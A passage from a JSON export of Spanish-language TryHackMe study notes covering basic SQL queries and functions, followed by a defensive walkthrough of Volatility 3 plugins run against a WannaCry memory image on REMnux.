expresión.\n\n```sql\nmysql> SELECT COUNT(*) AS total_books FROM books;\n+-------------+\n| total_books |\n+-------------+\n|           5 |\n+-------------+\n\n1 row in set (0.01 sec)\n```\n\n<h4>Función SUM()</h4>\nSuma todos los valores (no NULL) de una determinada columna.\n\n```sql\nmysql> SELECT SUM(price) AS total_price FROM books;\n+-------------+\n| total_price |\n+-------------+\n|      249.95 |\n+-------------+\n\n1 row in set (0.00 sec)\n```\n\n<h4>Función MAX()</h4>\nDevuelve el valor máximo de una columna dada.\n\n```sql\nmysql> SELECT MAX(published_date) AS latest_book FROM books;\n+-------------+\n| latest_book |\n+-------------+\n| 2021-12-21  |\n+-------------+\n\n1 row in set (0.00 sec)\n```\n\n<h4>Función MIN()</h4>\nDevuelve el menor valor de una columna dada.\n\n```sql\nmysql> SELECT MIN(published_date) AS earliest_book FROM books;\n+---------------+\n| earliest_book |\n+---------------+\n| 2014-10-14    |\n+---------------+\n\n1 row in set (0.00 sec)\n```\n"
  },
  {
    "title": "0. SQL Fundamentals",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/3-sql-fundamentals/0-sql-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/3. SQL Fundamentals/0. SQL Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 3. SQL Fundamentals",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/3. SQL Fundamentals/1. Introduction]]\n[[2. Databases 101]]\n[[3. SQL]]\n[[4. Database and Table Statements]]\n[[5. CRUD Operations]]\n[[6. Clauses]]\n[[7. Operators]]\n[[8. Functions]]\n"
  },
  {
    "title": "5. CRUD Operations",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/3-sql-fundamentals/5-crud-operations/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/3. SQL Fundamentals/5. CRUD Operations.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 3. SQL Fundamentals",
    "content": "**CRUD** significa **C**reate, **R**ead, **U**pdate y **D**elete, que son consideradas las operaciones básicas en cualquier sistema que maneja datos.\n\n----------------------\n<h2>Operación Crear (INSERT)</h2>\nNos permite introducir nuevos datos en una tabla. En MySQL, lo podemos hacer con `INSERT INTO`:\n\n```sql\nmysql> INSERT INTO books )id, name, published_date, description)\n\tVALUES (1, \"Android Security Internals\", \"2014-10-14\", \"An In-Depth Guide to Android's Security Architecture\");\n\nQUERY OK, 1 row affected (0.01 sec)\n\n```\n\n------------------------\n<h2>Operación Leer (SELECT)</h2>\nLa operación `SELECT` nos sirve para obtener datos de la tabla y verlos. Para ver todo el contenido de una tabla, por ejemplo, haríamos:\n\n```sql\nmysql> SELECT * FROM books;\n+----+----------------------------+----------------+----------------------------+\n| id | name                       | published_date | description                |\n+----+----------------------------+----------------+----------------------------+\n|  1 | Android Security Internals | 2014-10-14     | An In-Depth Guide to And...|\n+----+----------------------------+----------------+----------------------------+\n\n1 row in set (0.00 sec)\n```\n\nSi queremos ver una columna en específico, debemos especificarlas, por ejemplo:\n\n```sql\nmysql> SELECT name, description FROM books;\n+----------------------------+--------------------------------------------------+\n| name                       | description                                      |\n+----------------------------+--------------------------------------------------+\n| Android Security Internals | An In-Depth Guide Androids Security Architecture |\n+----------------------------+--------------------------------------------------+\n\n1 row in set (0.00 sec)   \n```\n\n----------------------------\n<h2>Operación Actualizar (UPDATE)</h2>\nLa operación `UPDATE` sirve para modificar una entrada existente y se usa de la siguiente manera:\n\n```sql\nmysql> UPDATE books\n\tSET description = \"An In-Depth Guide to Android's Security Architecture.\"\n\tWHERE id = 1;\n\nQuery OK, 1 row affected (0.00 sec)\nRows matched: 1 Changed: 1 Warnings: 0\n```\n\nUsamos `SET` para especificar el cambio. La cláusula `WHERE` especifica la columna que coincida con el criterio de búsqueda (busca la columnas DONDE la condición se cumpla).\n\n---------------------\n<h2>Operación Borrar (DELETE)</h2>\nLa operación de borrado elimina las entradas de una tabla. Para ello usamos `DELETE`.\n\n```sql\nmysql> DELETE FROM books WHERE id = 1;\n\nQuery OK, 1 row affected (0.00 sec)\n```\n\n"
  },
  {
    "title": "7. Operators",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/3-sql-fundamentals/7-operators/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/3. SQL Fundamentals/7. Operators.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 3. SQL Fundamentals",
    "content": "Cuando trabajamos con SQL y lidiamos con comparaciones y lógica, los operadores son nuestra forma de filtrar y manipular la información de forma efectiva.\n\n----------------------\n<h2>Operadores Lógicos</h2>\nEstos operadores comprueban la veracidad de una condición y devuelven un valor booleano `TRUE` o `FALSE`.\n\n<h4>Operador LIKE</h4>\nEs comúnmente usado junto a cláusulas `WHERE` para filtrar por patrones o columnas específicas.\n\n```sql\nmysql> SELECT *\n\tFROM books\n\tWHERE description LIKE \"%guide%\";\n```\n\n<h4>Operador AND</h4>\nUsa varias condiciones sobre una misma query y devuelve `TRUE` si todas son verdaderas y false si alguna no.\n\n```sql\nmysql> SELECT *\n    FROM books\n    WHERE category = \"Offensive Security\" AND name = \"Bug Bounty Bootcamp\"; \n```\n\n<h4>Operador OR</h4>\nCombina múltiples condiciones y devuelve `TRUE` si al menos una es verdadera.\n\n```sql\nmysql> SELECT *\n    FROM books\n    WHERE name LIKE \"%Android%\" OR name LIKE \"%iOS%\"; \n```\n\n<h4>Operador NOT</h4>\nEste operador invierte el valor de un valor booleano, es decir devuelve `TRUE` si es falso:\n\n```sql\nmysql> SELECT *\n    FROM books\n    WHERE NOT description LIKE \"%guide%\";\n```\n\n<h4>Operador BETWEEN</h4>\nNos permite seleccionar valores en un rango, por ejemplo:\n\n```sql\nmysql> SELECT *\n    FROM books\n    WHERE id BETWEEN 2 AND 4;\n```\n\n-----------------------\n<h2>Operadores de Comparación</h2>\nLos operadores comparativos se usan para comparar valores y comprobar si cumplen con el criterio especificado.\n\n<h4>Operador Igual Que</h4>\nEl operador `=` compara dos valores y devuelve `TRUE` si son iguales.\n\n```sql\nmysql> SELECT *\n    FROM books\n    WHERE name = \"Designing Secure Software\";\n```\n\n<h4>Operador No Igual Que</h4>\nEl operador `!=` compara expresiones y comprueba si no son iguales y si no lo son devuelve `TRUE`.\n\n```sql\nmysql> SELECT *\n    FROM books\n    WHERE category != \"Offensive Security\";\n```\n\n<h4>Operador Menor Que</h4>\nEl operador `<` comprueba si el valor de la izquierda es menor que el de la derecha, y si es así devuelve `TRUE`.\n\n```sql\nmysql> SELECT *\n    FROM books\n    WHERE published_date < \"2020-01-01\";\n```\n\n<h4>Operador Mayor Que</h4>\nHace lo contrario que el menor que, `>` comprueba si el valor de la izquierda es mayor que el de la derecha y si es así devuelve `TRUE`.\n\n```sql\nmysql> SELECT *\n    FROM books\n    WHERE published_date > \"2020-01-01\";\n```\n\n<h4>Operador Menor o Igual / Mayor o Igual Que</h4>\nLos operadores `<=` y `>=` comprueban lo que los operadores `<` y `>` pero además le suman el igual, es decir, que si son mayor o menor e igual el valor a la izquierda y a la derecha devuelven `TRUE`.\n\n```sql\nmysql> SELECT *\n    FROM books\n    WHERE published_date <= \"2021-11-15\";\n```"
  },
  {
    "title": "6. Clauses",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/3-sql-fundamentals/6-clauses/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/3. SQL Fundamentals/6. Clauses.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 3. SQL Fundamentals",
    "content": "Una cláusula es una parte de un comando que especifica el criterio de la información manipulada. Estas pueden ayudarnos a definir el tipo de dato y cómo debería de rescatarse o buscarse.\n\nYa hemos usado algunas, como `FROM` o `WHERE`. Esta lección se concentrará en las cláusulas: `DISTINCT`, `GROUP BY`, `ORDER BY` y `HAVING`.\n\n-----------------\n<h2>Cláusula DISTINCT</h2>\nLa cláusula `DISTINCT` se usa para evitar duplicados registros al hacer una query, devolviendo sólo valores únicos. La sintaxis es:\n\n```sql\nmysq> SELECT DISTINCT name FROM books;\n```\n\n------------------\n<h2>Cláusula GROUP BY</h2>\nSe usa para juntar información de múltiples registros y agrupa los resultados de la query en columnas. La sintaxis es:\n\n```sql\nmysql> SELECT name, COUNT(*)\n\tFROM books\n\tGROUP BY name;\n\n+----------------------------+----------+\n| name                       | COUNT(*) |\n+----------------------------+----------+\n| Android Security Internals |        1 |\n| Bug Bounty Bootcamp        |        1 |\n| Car Hacker`s Handbook      |        1 |\n| Designing Secure Software  |        1 |\n| Ethical Hacking            |        2 |\n+----------------------------+----------+\n\n5 rows in set (0.00 sec)\n```\n\n--------------------\n<h2>Cláusula ORDER BY</h2>\nSe usa para filtrar los registros devueltos por una query en orden ascendente o descendente usando funciones como `ASC` o `DESC`. La sintaxis es:\n\n```sql\nmysql> SELECT *\n\tFROM books\n\tORDER BY published_date ASC;\n```\n\n-----------------\n<h2>Cláusula HAVING</h2>\nLa cláusula `HAVING` es usada junto con otras cláusulas para filtrar grupos o resultados de registros basado en una condición, por ejemplo:\n\n```sql\nmysql> SELECT name, COUNT(*)\n\tFROM books\n\tGROUP BY name\n\tHAVING name LIKE '%Hack%';\n\t\n+-----------------------+----------+\n| name                  | COUNT(*) |\n+-----------------------+----------+\n| Car Hacker`s Handbook |        1 |\n| Ethical Hacking       |        2 |\n+-----------------------+----------+\n\n2 rows in set (0.00 sec)\n```\n"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/3-sql-fundamentals/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/3. SQL Fundamentals/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 3. SQL Fundamentals",
    "content": "La ciberseguridad es un tópico grande que cubre un rango amplio de temas. Cuando trabajamos en securizar una aplicación web, trabajamos con SOC o SIEM, configuramos autentificación de usuarios, etc. Podemos hacer uso de las bases de datos.\n\n-------------\n<h2>Pre-Requisitos</h2>\nEsta unidad está hecha para principiantes por lo que no se necesitan pasos previos.\n\n--------------\n<h2>Objetivos de aprendizaje</h2>\n- Entender  lo que son las bases de datos y sus conceptos clave.\n- Entender los diferentes tipos de bases de datos.\n- Entender qué es SQL.\n- Entender y ser capaz de usar Operaciones SQL CRUD. \n- Entender y ser capaz de usar Operaciones SQL de Cláusulas.\n- Entender y ser capaz de usar Operaciones SQL.\n- Entender y ser capaz de usar Operadores SQL.\n- Entender y ser capaz de usar Funciones SQL.\n\n"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/3-remnux-getting-started/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/3. REMnux - Getting Started/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 3. REMnux - Getting Started",
    "content": "Analizar software potencialmente malicioso puede ser peligroso, especialmente cuando este es parte de un incidente de seguridad en ejecución. Los resultados deben ser lo más precisos posibles y los analistas deben usar diferentes herramientas, máquinas y entornos para conseguirlo. En esta unidad usaremos REMnux VM.\n\nREMnux VM es una distribución de Linux especializada. Incluye herramientas como Volatility, YARA, Wireshark, oledump e INetSim. También ofrece entornos de sandbox para diseccionar software potencialmente malicioso sin riesgo de contaminar tu sistema primario. Es tu laboratorio listo para usar sin necesidad de instalaciones manuales.\n\n--------------------------\n<h2>Objetivos de Aporendizaje</h2>\n- Explorar las herramientas dentro de REMnux VM.\n- Aprender a cómo usar las herramientas para analizar documentos potencialmente maliciosos.\n- Aprender a cómo simular una red falsa para ayudar en el análisis.\n- Familiarizarse con las herramientas usadas para analizar imágenes de memoria.\n\n----------------------------------\n<h2>Pre-requisitos</h2>\n[[0. CyberChef - The Basics]]\n\n"
  },
  {
    "title": "4. Memory Investigation - Evidence Processing",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/3-remnux-getting-started/4-memory-investigation-evidence-processing/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/3. REMnux - Getting Started/4. Memory Investigation - Evidence Processing.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 3. REMnux - Getting Started",
    "content": "Una de las prácticas investigativas más comunes en la forénsica digital es el pre-procesado de evidencia. Esto incluye ejecutar herramientas y guardar los resultados en texto o JSON. El analista normalmente confía en herramientas como Volatility al lidiar con imágenes de memoria como evidencia. Esta herramienta ya está incluida en REMnux. Los comandos de volatility se ejecutan para identificar y extraer artefactos específicos de las imágenes de memoria.\n\n----------------------------\n<h2>Pre-procesado con Volatility</h2>\nEn esta tarea usaremos la versión de la herramienta Volatility 3. Sin embargo, no iremos muy profundo en la parte de análisis de resultados. Queremos que te familiarices un poco con la herramienta. Ejecuta el comando como se dice y espera el resultado. Cada plugin toma entre 2-3 minutos para mostrar el output.\n\nAquí hay algunos de los parámetros o plugins que usaremos. Nos enfocaremos en plugins de Windows.\n\nEn la máquina REMnux, `sudo su` y luego navega hasta `/home/ubuntu/Desktop/tasks/Wcry_memory_image/` y nuestro archivo será **wcry.mem**. Correremos cada plugin después del comando `vol3 -f wcry.mem`.\n\n----------------------------\n<h2>PsTree</h2>\nEste plugin procesa en un árbol basado en los procesos padres:\n\n```powershell\nroot@10.10.134.94:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.pstree.PsTree\nVolatility 3 Framework 2.0.0\nProgress:  100.00\t\tPDB scanning finished\n\nPID\tPPID\tImageFileName\tOffset(V)\tThreads\tHandles\tSessionId\tWow64\tCreateTime\tExitTime\n\n4\t0\tSystem\t0x823c8830\t51\t244\tN/A\tFalse\tN/A\tN/A\n* 348\t4\tsmss.exe\t0x82169020\t3\t19\tN/A\tFalse\t2017-05-12 21:21:55.000000 \tN/A\n** 620\t348\twinlogon.exe\t0x8216e020\t23\t536\t0\tFalse\t2017-05-12 21:22:01.000000 \tN/A\n*** 664\t620\tservices.exe\t0x821937f0\t15\t265\t0\tFalse\t2017-05-12 21:22:01.000000 \tN/A\n**** 1024\t664\tsvchost.exe\t0x821af7e8\t79\t1366\t0\tFalse\t2017-05-12 21:22:03.000000 \tN/A\n***** 1768\t1024\twuauclt.exe\t0x81f747c0\t7\t132\t0\tFalse\t2017-05-12 21:22:52.000000 \tN/A\n***** 1168\t1024\twscntfy.exe\t0x81fea8a0\t1\t37\t0\tFalse\t2017-05-12 21:22:56.000000 \tN/A\n**** 1152\t664\tsvchost.exe\t0x821bea78\t10\t173\t0\tFalse\t2017-05-12 21:22:06.000000 \tN/A\n**** 544\t664\talg.exe\t0x82010020\t6\t101\t0\tFalse\t2017-05-12 21:22:55.000000 \tN/A\n**** 836\t664\tsvchost.exe\t0x8221a2c0\t19\t211\t0\tFalse\t2017-05-12 21:22:02.000000 \tN/A\n**** 260\t664\tsvchost.exe\t0x81fb95d8\t5\t105\t0\tFalse\t2017-05-12 21:22:18.000000 \tN/A\n**** 904\t664\tsvchost.exe\t0x821b5230\t9\t227\t0\tFalse\t2017-05-12 21:22:03.000000 \tN/A\n**** 1484\t664\tspoolsv.exe\t0x821e2da0\t14\t124\t0\tFalse\t2017-05-12 21:22:09.000000 \tN/A\n**** 1084\t664\tsvchost.exe\t0x8203b7a8\t6\t72\t0\tFalse\t2017-05-12 21:22:03.000000 \tN/A\n*** 676\t620\tlsass.exe\t0x82191658\t23\t353\t0\tFalse\t2017-05-12 21:22:01.000000 \tN/A\n** 596\t348\tcsrss.exe\t0x82161da0\t12\t352\t0\tFalse\t2017-05-12 21:22:00.000000 \tN/A\n1636\t1608\texplorer.exe\t0x821d9da0\t11\t331\t0\tFalse\t2017-05-12 21:22:10.000000 \tN/A\n* 1956\t1636\tctfmon.exe\t0x82231da0\t1\t86\t0\tFalse\t2017-05-12 21:22:14.000000 \tN/A\n* 1940\t1636\ttasksche.exe\t0x82218da0\t7\t51\t0\tFalse\t2017-05-12 21:22:14.000000 \tN/A\n** 740\t1940\t@WanaDecryptor@\t0x81fde308\t2\t70\t0\tFalse\t2017-05-12 21:22:22.000000 \tN/A\n```\n\n----------------------------\n<h2>PsList</h2>\nEste plugin se usa para listar todos los procesos actualmente activos en la máquina.\n\n```powershell\nroot@10.10.134.94:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.pslist.PsList\nVolatility 3 Framework 2.0.0\nProgress:  100.00\t\tPDB scanning finished\n\nPID\tPPID\tImageFileName\tOffset(V)\tThreads\tHandles\tSessionId\tWow64\tCreateTime\tExitTime\tFile output\n\n4\t0\tSystem\t0x823c8830\t51\t244\tN/A\tFalse\tN/A\tN/A\tDisabled\n348\t4\tsmss.exe\t0x82169020\t3\t19\tN/A\tFalse\t2017-05-12 21:21:55.000000 \tN/A\tDisabled\n596\t348\tcsrss.exe\t0x82161da0\t12\t352\t0\tFalse\t2017-05-12 21:22:00.000000 \tN/A\tDisabled\n620\t348\twinlogon.exe\t0x8216e020\t23\t536\t0\tFalse\t2017-05-12 21:22:01.000000 \tN/A\tDisabled\n664\t620\tservices.exe\t0x821937f0\t15\t265\t0\tFalse\t2017-05-12 21:22:01.000000 \tN/A\tDisabled\n676\t620\tlsass.exe\t0x82191658\t23\t353\t0\tFalse\t2017-05-12 21:22:01.000000 \tN/A\tDisabled\n836\t664\tsvchost.exe\t0x8221a2c0\t19\t211\t0\tFalse\t2017-05-12 21:22:02.000000 \tN/A\tDisabled\n904\t664\tsvchost.exe\t0x821b5230\t9\t227\t0\tFalse\t2017-05-12 21:22:03.000000 \tN/A\tDisabled\n1024\t664\tsvchost.exe\t0x821af7e8\t79\t1366\t0\tFalse\t2017-05-12 21:22:03.000000 \tN/A\tDisabled\n1084\t664\tsvchost.exe\t0x8203b7a8\t6\t72\t0\tFalse\t2017-05-12 21:22:03.000000 \tN/A\tDisabled\n1152\t664\tsvchost.exe\t0x821bea78\t10\t173\t0\tFalse\t2017-05-12 21:22:06.000000 \tN/A\tDisabled\n1484\t664\tspoolsv.exe\t0x821e2da0\t14\t124\t0\tFalse\t2017-05-12 21:22:09.000000 \tN/A\tDisabled\n1636\t1608\texplorer.exe\t0x821d9da0\t11\t331\t0\tFalse\t2017-05-12 21:22:10.000000 \tN/A\tDisabled\n1940\t1636\ttasksche.exe\t0x82218da0\t7\t51\t0\tFalse\t2017-05-12 21:22:14.000000 \tN/A\tDisabled\n1956\t1636\tctfmon.exe\t0x82231da0\t1\t86\t0\tFalse\t2017-05-12 21:22:14.000000 \tN/A\tDisabled\n260\t664\tsvchost.exe\t0x81fb95d8\t5\t105\t0\tFalse\t2017-05-12 21:22:18.000000 \tN/A\tDisabled\n740\t1940\t@WanaDecryptor@\t0x81fde308\t2\t70\t0\tFalse\t2017-05-12 21:22:22.000000 \tN/A\tDisabled\n1768\t1024\twuauclt.exe\t0x81f747c0\t7\t132\t0\tFalse\t2017-05-12 21:22:52.000000 \tN/A\tDisabled\n544\t664\talg.exe\t0x82010020\t6\t101\t0\tFalse\t2017-05-12 21:22:55.000000 \tN/A\tDisabled\n1168\t1024\twscntfy.exe\t0x81fea8a0\t1\t37\t0\tFalse\t2017-05-12 21:22:56.000000 \tN/A\tDisabled\n```\n\n---------------------------\n<h2>CmdLine</h2>\nEste plugin se usa para listar argumentos de procesos de linea de comandos.\n\n```powershell\nroot@10.10.134.94:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.cmdline.CmdLine\nVolatility 3 Framework 2.0.0\nProgress:  100.00\t\tPDB scanning finished\n\nPID\tProcess\tArgs\n\n4\tSystem\tRequired memory at 0x10 is not valid (process exited?)\n348\tsmss.exe\t\\SystemRoot\\System32\\smss.exe\n596\tcsrss.exe\tC:\\WINDOWS\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,3072,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ProfileControl=Off MaxRequestThreads=16\n620\twinlogon.exe\twinlogon.exe\n664\tservices.exe\tC:\\WINDOWS\\system32\\services.exe\n676\tlsass.exe\tC:\\WINDOWS\\system32\\lsass.exe\n836\tsvchost.exe\tC:\\WINDOWS\\system32\\svchost -k DcomLaunch\n904\tsvchost.exe\tC:\\WINDOWS\\system32\\svchost -k rpcss\n1024\tsvchost.exe\tC:\\WINDOWS\\System32\\svchost.exe -k netsvcs\n1084\tsvchost.exe\tC:\\WINDOWS\\system32\\svchost.exe -k NetworkService\n1152\tsvchost.exe\tC:\\WINDOWS\\system32\\svchost.exe -k LocalService\n1484\tspoolsv.exe\tC:\\WINDOWS\\system32\\spoolsv.exe\n1636\texplorer.exe\tC:\\WINDOWS\\Explorer.EXE\n1940\ttasksche.exe\t\"C:\\Intel\\ivecuqmanpnirkt615\\tasksche.exe\" \n1956\tctfmon.exe\t\"C:\\WINDOWS\\system32\\ctfmon.exe\" \n260\tsvchost.exe\tC:\\WINDOWS\\system32\\svchost.exe -k LocalService\n740\t@WanaDecryptor@\t@WanaDecryptor@.exe\n1768\twuauclt.exe\t\"C:\\WINDOWS\\system32\\wuauclt.exe\" /RunStoreAsComServer Local\\[400]SUSDS81a6658cb72fa845814e75cca9a42bf2\n544\talg.exe\tC:\\WINDOWS\\System32\\alg.exe\n1168\twscntfy.exe\tC:\\WINDOWS\\system32\\wscntfy.exe\n```\n\n------------------------------------\n<h2>FileScan</h2>\nEste plugin escanea objetos en una imagen de memoria particular. Los resultados tienen más de 1400 líneas, pongo sólo un ejemplo del output.\n\n```powershell\nroot@10.10.134.94:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.filescan.FileScan\nVolatility 3 Framework 2.0.0\nProgress:  100.00\t\tPDB scanning finished\n\nOffset\tName\tSize\n0x1f40310\t\\Endpoint\t112\n0x1f65718\t\\Endpoint\t112\n0x1f66cd8\t\\WINDOWS\\system32\\wbem\\wmipcima.dll\t112\n0x1f67198\t\\WINDOWS\\Prefetch\\TASKDL.EXE-01687054.pf\t112\n0x1f67a70\t\\WINDOWS\\system32\\security.dll\t112\n0x1f67c68\t\\boot.ini\t112\n0x1f67ef8\t\\WINDOWS\\system32\\cfgmgr32.dll\t112\n0x1f684d0\t\\WINDOWS\\system32\\wbem\\framedyn.dll\t112\n0x1f686d8\t\\WINDOWS\\system32\\wbem\\cimwin32.dll\t112\n0x1f6a7f0\t\\WINDOWS\\system32\\kmddsp.tsp\t112\n0x1f6ae20\t\\$Directory\t112\n0x1f6b9b0\t\\$Directory\t112\n0x1f6bbf8\t\\$Directory\t112\n```\n\n---------------------------\n<h2>DllList</h2>\nEste plugin lista los módulos cargados en una imagen de memoria particular de Windows. Debido a limitación de texto, no podemos ver el resultado aquí.\n\n```powershell\noot@10.10.134.94:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.dlllist.DllList\nVolatility 3 Framework 2.0.0\nProgress:  100.00\t\tPDB scanning finished\n```\n\n-------------------------------------\n<h2>PsScan</h2>\nEste plugin se usa para escanear procesos presentes en imagenes de memorias Windows particulares.\n\n```powershell\nroot@10.10.134.94:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.psscan.PsScan\nVolatility 3 Framework 2.0.0\nProgress:  100.00\t\tPDB scanning finished\n\nPID\tPPID\tImageFileName\tOffset(V)\tThreads\tHandles\tSessionId\tWow64\tCreateTime\tExitTime\tFile output\n860\t1940\ttaskdl.exe\t0x1f4daf0\t0\t-\t0\tFalse\t2017-05-12 21:26:23.000000 \t2017-05-12 21:26:23.000000 \tDisabled\n536\t1940\ttaskse.exe\t0x1f53d18\t0\t-\t0\tFalse\t2017-05-12 21:26:22.000000 \t2017-05-12 21:26:23.000000 \tDisabled\n424\t1940\t@WanaDecryptor@\t0x1f69b50\t0\t-\t0\tFalse\t2017-05-12 21:25:52.000000 \t2017-05-12 21:25:53.000000 \tDisabled\n1768\t1024\twuauclt.exe\t0x1f747c0\t7\t132\t0\tFalse\t2017-05-12 21:22:52.000000 \tN/A\tDisabled\n576\t1940\t@WanaDecryptor@\t0x1f8ba58\t0\t-\t0\tFalse\t2017-05-12 21:26:22.000000 \t2017-05-12 21:26:23.000000 \tDisabled\n260\t664\tsvchost.exe\t0x1fb95d8\t5\t105\t0\tFalse\t2017-05-12 21:22:18.000000 \tN/A\tDisabled\n740\t1940\t@WanaDecryptor@\t0x1fde308\t2\t70\t0\tFalse\t2017-05-12 21:22:22.000000 \tN/A\tDisabled\n1168\t1024\twscntfy.exe\t0x1fea8a0\t1\t37\t0\tFalse\t2017-05-12 21:22:56.000000 \tN/A\tDisabled\n544\t664\talg.exe\t0x2010020\t6\t101\t0\tFalse\t2017-05-12 21:22:55.000000 \tN/A\tDisabled\n1084\t664\tsvchost.exe\t0x203b7a8\t6\t72\t0\tFalse\t2017-05-12 21:22:03.000000 \tN/A\tDisabled\n596\t348\tcsrss.exe\t0x2161da0\t12\t352\t0\tFalse\t2017-05-12 21:22:00.000000 \tN/A\tDisabled\n348\t4\tsmss.exe\t0x2169020\t3\t19\tN/A\tFalse\t2017-05-12 21:21:55.000000 \tN/A\tDisabled\n620\t348\twinlogon.exe\t0x216e020\t23\t536\t0\tFalse\t2017-05-12 21:22:01.000000 \tN/A\tDisabled\n676\t620\tlsass.exe\t0x2191658\t23\t353\t0\tFalse\t2017-05-12 21:22:01.000000 \tN/A\tDisabled\n664\t620\tservices.exe\t0x21937f0\t15\t265\t0\tFalse\t2017-05-12 21:22:01.000000 \tN/A\tDisabled\n1024\t664\tsvchost.exe\t0x21af7e8\t79\t1366\t0\tFalse\t2017-05-12 21:22:03.000000 \tN/A\tDisabled\n904\t664\tsvchost.exe\t0x21b5230\t9\t227\t0\tFalse\t2017-05-12 21:22:03.000000 \tN/A\tDisabled\n1152\t664\tsvchost.exe\t0x21bea78\t10\t173\t0\tFalse\t2017-05-12 21:22:06.000000 \tN/A\tDisabled\n1636\t1608\texplorer.exe\t0x21d9da0\t11\t331\t0\tFalse\t2017-05-12 21:22:10.000000 \tN/A\tDisabled\n1484\t664\tspoolsv.exe\t0x21e2da0\t14\t124\t0\tFalse\t2017-05-12 21:22:09.000000 \tN/A\tDisabled\n1940\t1636\ttasksche.exe\t0x2218da0\t7\t51\t0\tFalse\t2017-05-12 21:22:14.000000 \tN/A\tDisabled\n836\t664\tsvchost.exe\t0x221a2c0\t19\t211\t0\tFalse\t2017-05-12 21:22:02.000000 \tN/A\tDisabled\n1956\t1636\tctfmon.exe\t0x2231da0\t1\t86\t0\tFalse\t2017-05-12 21:22:14.000000 \tN/A\tDisabled\n4\t0\tSystem\t0x23c8830\t51\t244\tN/A\tFalse\tN/A\tN/A\tDisabled\n```\n\n-------------------------------------\n<h2>Malfind</h2>\nEste plugin se usa para listar rangos de procesos de memoria que potencialmente tienen código inyectado. No habrá resultados por limitaciones de texto.\n\n```powershell\nroot@10.10.134.94:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.malfind.Malfind\nVolatility 3 Framework 2.0.0\nProgress:  100.00\t\tPDB scanning finished\n```\n\nPara más información respecto a plugins consulta este [link](https://volatility3.readthedocs.io/en/stable/volatility3.plugins.html).\n\nPero ahora los tienes uno por uno, ¿cómo procesamos esto en bloque? La respuesta es haciendo un bucle y metiendo los logs en archivos:\n\n```powershell\nroot@10.10.134.94:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt; done\n```\n\nVeamos el comando:\n\n- Creamos una variable `$plugin` con los valores de cada plugin.\n- Entonces el comando `vol3` corre el parámetro `-q`, que significa modo silencioso.\n- El parámetro `-f` hace que lea de la captura de memoria.\n- La parte `plugin > wcry.$plugin.txt; done;` hace que volatility corra con los plugins y meta el resultado en un archivo con el nombre del plugin.\nDespués de ejecutar el comando nos encontraremos con esto:\n\n![[Pasted image 20251029200952.png]]\n\n-------------------------------\n<h2>Pre-procesado con Strings</h2>\nDespués, pre-procesaremos la imagen de memoria con las utilidades de strings de Linux. Extraeremos las cadenas: ASCII, 16-bit little-endian, y 16-bit big-endian. Con los siguientes comandos:\n\n```powershell\nroot@10.10.134.94:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ strings wcry.mem > wcry.strings.ascii.txt\nroot@10.10.134.94:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ strings -e l  wcry.mem > wcry.strings.unicode_little_endian.txt\nroot@10.10.134.94:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ strings -e b  wcry.mem > wcry.strings.unicode_big_endian.txt\n```\n\nLos comandos strings extraen texto ASCII legible. La opción `-e l` le dice a la string que extraiga 16-bit little endian. Mientras que la opción `-e b` le dice que extraiga las strings 16-bit  big endian."
  },
  {
    "title": "3. Fake Network to Aid Analysis",
